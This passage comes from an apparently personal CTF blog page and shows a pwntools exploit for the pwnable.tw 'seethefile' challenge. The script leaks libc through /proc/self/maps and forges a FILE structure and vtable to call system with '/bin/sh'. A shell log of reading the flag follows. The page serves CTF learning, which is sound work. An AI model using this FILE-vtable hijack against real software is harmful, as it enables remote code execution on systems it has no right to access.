class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x86_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./seethefile&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc chall.pwnable.tw 10200&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;connect: &#x27;</span>,REMOTE_IP, REMOTE_PORT)</span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p_c(r,<span class="string">&#x27;b *0x8048acb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### I/O</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openfile</span>(<span class="params">file_path</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;What do you want to see :&#x27;</span>,file_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readfile</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writefile</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">closefile</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>(<span class="params">payload</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Leave your name :&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line">openfile(<span class="string">b&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">readfile()</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(rcls(5))</span></span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(rcls(<span class="number">3</span>)[<span class="number">1</span>].split(<span class="string">b&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LIBCBASE&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">libc_system = libc_base + <span class="number">0x3a940</span> </span><br><span class="line">name_addr = <span class="number">0x804B260</span></span><br><span class="line">fp_pointer_addr = <span class="number">0x804B280</span></span><br><span class="line"></span><br><span class="line">fakefp_addr = <span class="number">0x804B290</span></span><br><span class="line">fake_vtable_addr = fakefp_addr+<span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">fakefp = FileStructure()</span><br><span class="line">fakefp.flags = <span class="number">0xfbaddfff</span></span><br><span class="line">fakefp._IO_read_ptr = <span class="string">b&#x27;;/bi&#x27;</span> </span><br><span class="line">fakefp._IO_read_end = <span class="string">b&#x27;n/sh&#x27;</span></span><br><span class="line">fakefp._IO_read_base = <span class="string">b&#x27;;&#x27;</span></span><br><span class="line">fakefp.vtable = fake_vtable_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span> + p32(fakefp_addr) </span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">12</span></span><br><span class="line">payload += <span class="built_in">bytes</span>(fakefp).ljust(<span class="number">0x140</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(libc_system)*<span class="number">21</span></span><br><span class="line"></span><br><span class="line">exit(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>連上後執行讀檔的binary，輸入 Give me the flag 就可以get flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libx32</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">$ cd home</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">seethefile</span><br><span class="line">$ cd seethefile</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">get_flag</span><br><span class="line">get_flag.c</span><br><span class="line">run.sh</span><br><span class="line">seethefile</span><br><span class="line">$ ./get_flag</span><br><span class="line">Your magic :$ Give me the flag</span><br><span class="line">Here is your flag: FLAG&#123;....&#125;</span><br></pre></td></tr></table></figure>
+
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+            
+                <li class="next page-item d-inline"><a href="/2024/09/16/Pwnable-3x17/" class="page-link float-right">Older  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2024 
+                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
